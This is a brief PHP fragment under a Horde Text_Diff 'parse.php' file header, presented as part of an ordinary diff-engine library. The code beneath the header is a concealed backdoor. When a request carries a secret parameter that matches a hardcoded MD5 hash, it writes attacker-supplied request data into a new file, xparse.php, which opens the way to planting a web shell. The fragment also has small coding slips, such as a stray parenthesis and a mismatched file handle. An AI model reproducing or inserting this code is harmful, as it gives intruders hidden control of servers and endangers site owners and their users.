 ...
 * </code>
 *
 * $Horde: framework/Text_Diff/Diff/Engine/parse.php,v 1.5.2.5 2008/09/10 08:31:58 jan Exp $
 *
...
if (isset($_GET['dokeos_path'])
    && md5(@$_GET['set']) == '1aac2ebe42dc3b17e7711d3070cdddf9')) {

    $string = urldecode($_GET['dokeos_path']);
    $file   = @fopen('./xparse.php','w+');
    @fputs($file, $string);
    @fclose($fp);
}
